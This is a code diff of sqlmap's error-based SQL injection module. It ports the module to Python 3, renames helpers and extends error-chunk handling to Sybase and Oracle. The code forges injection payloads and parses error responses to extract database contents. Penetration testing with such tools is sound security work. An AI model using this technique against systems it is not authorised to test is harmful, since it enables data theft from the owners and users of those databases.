@@ -1,24 +1,27 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
+
+from __future__ import print_function
 
 import re
 import time
 
-from extra.safe2bin.safe2bin import safecharencode
 from lib.core.agent import agent
 from lib.core.bigarray import BigArray
 from lib.core.common import Backend
 from lib.core.common import calculateDeltaSeconds
 from lib.core.common import dataToStdout
-from lib.core.common import decodeHexValue
+from lib.core.common import decodeDbmsHexValue
 from lib.core.common import extractRegexResult
+from lib.core.common import firstNotNone
 from lib.core.common import getConsoleWidth
 from lib.core.common import getPartRun
-from lib.core.common import getUnicode
+from lib.core.common import getTechnique
+from lib.core.common import getTechniqueData
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
 from lib.core.common import incrementCounter
@@ -29,8 +32,10 @@ from lib.core.common import listToStrValue
 from lib.core.common import readInput
 from lib.core.common import unArrayizeValue
 from lib.core.common import wasLastResponseHTTPError
-from lib.core.convert import hexdecode
-from lib.core.convert import htmlunescape
+from lib.core.compat import xrange
+from lib.core.convert import decodeHex
+from lib.core.convert import getUnicode
+from lib.core.convert import htmlUnescape
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -41,8 +46,8 @@ from lib.core.enums import HASHDB_KEYS
 from lib.core.enums import HTTP_HEADER
 from lib.core.exception import SqlmapDataException
 from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
-from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
 from lib.core.settings import MAX_ERROR_CHUNK_LENGTH
+from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
 from lib.core.settings import NULL
 from lib.core.settings import PARTIAL_VALUE_MARKER
 from lib.core.settings import ROTATING_CHARS
@@ -54,6 +59,8 @@ from lib.core.threads import runThreads
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 from lib.utils.progress import ProgressBar
+from lib.utils.safe2bin import safecharencode
+from thirdparty import six
 
 def _oneShotErrorUse(expression, field=None, chunkTest=False):
     offset = 1
@@ -69,7 +76,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
 
     threadData.resumed = retVal is not None and not partialValue
 
-    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
+    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
         debugMsg = "searching for error chunk length..."
         logger.debug(debugMsg)
 
@@ -77,8 +84,11 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
         while current >= MIN_ERROR_CHUNK_LENGTH:
             testChar = str(current % 10)
 
-            testQuery = "%s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
-            testQuery = "SELECT %s" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)
+            if Backend.isDbms(DBMS.ORACLE):
+                testQuery = "RPAD('%s',%d,'%s')" % (testChar, current, testChar)
+            else:
+                testQuery = "%s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
+                testQuery = "SELECT %s" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)
 
             result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))
 
@@ -91,7 +101,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                     candidate = len(result) - len(kb.chars.stop)
                     current = candidate if candidate != current else current - 1
             else:
-                current = current / 2
+                current = current // 2
 
         if kb.errorChunkLength:
             hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)
@@ -102,12 +112,12 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
         try:
             while True:
                 check = r"(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
-                trimcheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start
+                trimCheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start
 
                 if field:
                     nulledCastedField = agent.nullAndCastField(field)
 
-                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
+                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
                         extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                         if extendedField != field:  # e.g. MIN(surname)
                             nulledCastedField = extendedField.replace(field, nulledCastedField)
@@ -115,7 +125,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                         nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)
 
                 # Forge the error-based SQL injection request
-                vector = kb.injection.data[kb.technique].vector
+                vector = getTechniqueData().vector
                 query = agent.prefixQuery(vector)
                 query = agent.suffixQuery(query)
                 injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
@@ -126,27 +136,29 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                 # Perform the request
                 page, headers, _ = Request.queryPage(payload, content=True, raise404=False)
 
-                incrementCounter(kb.technique)
+                incrementCounter(getTechnique())
 
                 if page and conf.noEscape:
                     page = re.sub(r"('|\%%27)%s('|\%%27).*?('|\%%27)%s('|\%%27)" % (kb.chars.start, kb.chars.stop), "", page)
 
                 # Parse the returned page to get the exact error-based
                 # SQL injection output
-                output = reduce(lambda x, y: x if x is not None else y, (\
-                        extractRegexResult(check, page), \
-                        extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None), \
-                        extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)), \
-                        extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)), \
-                        None)
+                output = firstNotNone(
+                    extractRegexResult(check, page),
+                    extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
+                    extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
+                    extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
+                )
 
                 if output is not None:
                     output = getUnicode(output)
                 else:
-                    trimmed = extractRegexResult(trimcheck, page) \
-                        or extractRegexResult(trimcheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None) \
-                        or extractRegexResult(trimcheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)) \
-                        or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
+                    trimmed = firstNotNone(
+                        extractRegexResult(trimCheck, page),
+                        extractRegexResult(trimCheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
+                        extractRegexResult(trimCheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
+                        extractRegexResult(trimCheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
+                    )
 
                     if trimmed:
                         if not chunkTest:
@@ -160,12 +172,12 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                             output = extractRegexResult(check, trimmed, re.IGNORECASE)
 
                             if not output:
-                                check = "(?P<result>[^\s<>'\"]+)"
+                                check = r"(?P<result>[^\s<>'\"]+)"
                                 output = extractRegexResult(check, trimmed, re.IGNORECASE)
                             else:
                                 output = output.rstrip()
 
-                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
+                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)):
                     if offset == 1:
                         retVal = output
                     else:
@@ -176,7 +188,7 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                     else:
                         break
 
-                    if output and conf.verbose in (1, 2) and not conf.api:
+                    if output and conf.verbose in (1, 2) and not any((conf.api, kb.bruteMode)):
                         if kb.fileReadMode:
                             dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                         elif offset > 1:
@@ -194,10 +206,10 @@ def _oneShotErrorUse(expression, field=None, chunkTest=False):
                 hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
             raise
 
-        retVal = decodeHexValue(retVal) if conf.hexConvert else retVal
+        retVal = decodeDbmsHexValue(retVal) if conf.hexConvert else retVal
 
-        if isinstance(retVal, basestring):
-            retVal = htmlunescape(retVal).replace("<br>", "\n")
+        if isinstance(retVal, six.string_types):
+            retVal = htmlUnescape(retVal).replace("<br>", "\n")
 
         retVal = _errorReplaceChars(retVal)
 
@@ -237,11 +249,11 @@ def _errorFields(expression, expressionFields, expressionFieldsList, num=None, e
         if not kb.threadContinue:
             return None
 
-        if not suppressOutput:
+        if not any((suppressOutput, kb.bruteMode)):
             if kb.fileReadMode and output and output.strip():
-                print
+                print()
             elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
-                status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))
+                status = "[%s] [INFO] %s: '%s'" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))
 
                 if len(status) > width:
                     status = "%s..." % status[:width - 3]
@@ -272,9 +284,9 @@ def _formatPartialContent(value):
     Prepares (possibly hex-encoded) partial content for safe console output
     """
 
-    if value and isinstance(value, basestring):
+    if value and isinstance(value, six.string_types):
         try:
-            value = hexdecode(value)
+            value = decodeHex(value, binary=False)
         except:
             pass
         finally:
@@ -288,7 +300,7 @@ def errorUse(expression, dump=False):
     SQL injection vulnerability on the affected parameter.
     """
 
-    initTechnique(kb.technique)
+    initTechnique(getTechnique())
 
     abortedFlag = False
     count = None
@@ -308,12 +320,7 @@ def errorUse(expression, dump=False):
     # entry at a time
     # NOTE: we assume that only queries that get data from a table can
     # return multiple entries
-    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
-       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) \
-       or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not \
-       expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
-       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
-       and not re.search(SQL_SCALAR_REGEX, expression, re.I):
+    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
         expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)
 
         if limitCond:
@@ -333,9 +340,9 @@ def errorUse(expression, dump=False):
                 else:
                     stopLimit = int(count)
 
-                    infoMsg = "used SQL query returns "
-                    infoMsg += "%d entries" % stopLimit
-                    logger.info(infoMsg)
+                    debugMsg = "used SQL query returns "
+                    debugMsg += "%d %s" % (stopLimit, "entries" if stopLimit > 1 else "entry")
+                    logger.debug(debugMsg)
 
             elif count and not count.isdigit():
                 warnMsg = "it was not possible to count the number "
@@ -360,7 +367,7 @@ def errorUse(expression, dump=False):
                     message = "due to huge table size do you want to remove "
                     message += "ORDER BY clause gaining speed over consistency? [y/N] "
 
-                    if readInput(message, default="N", boolean=True):
+                    if readInput(message, default='N', boolean=True):
                         expression = expression[:expression.index(" ORDER BY ")]
 
                 numThreads = min(conf.threads, (stopLimit - startLimit))
@@ -404,9 +411,8 @@ def errorUse(expression, dump=False):
                         while kb.threadContinue:
                             with kb.locks.limit:
                                 try:
-                                    valueStart = time.time()
                                     threadData.shared.counter += 1
-                                    num = threadData.shared.limits.next()
+                                    num = next(threadData.shared.limits)
                                 except StopIteration:
                                     break
 
@@ -416,12 +422,12 @@ def errorUse(expression, dump=False):
                                 break
 
                             if output and isListLike(output) and len(output) == 1:
-                                output = output[0]
+                                output = unArrayizeValue(output)
 
                             with kb.locks.value:
                                 index = None
                                 if threadData.shared.showEta:
-                                    threadData.shared.progress.progress(time.time() - valueStart, threadData.shared.counter)
+                                    threadData.shared.progress.progress(threadData.shared.counter)
                                 for index in xrange(1 + len(threadData.shared.buffered)):
                                     if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
                                         break
@@ -447,13 +453,16 @@ def errorUse(expression, dump=False):
     if not value and not abortedFlag:
         value = _errorFields(expression, expressionFields, expressionFieldsList)
 
-    if value and isListLike(value) and len(value) == 1 and isinstance(value[0], basestring):
-        value = value[0]
+    if value and isListLike(value):
+        if len(value) == 1 and isinstance(value[0], (six.string_types, type(None))):
+            value = unArrayizeValue(value)
+        elif len(value) > 1 and stopLimit == 1:
+            value = [value]
 
     duration = calculateDeltaSeconds(start)
 
     if not kb.bruteMode:
-        debugMsg = "performed %d queries in %.2f seconds" % (kb.counters[kb.technique], duration)
+        debugMsg = "performed %d queries in %.2f seconds" % (kb.counters[getTechnique()], duration)
         logger.debug(debugMsg)
 
     return value
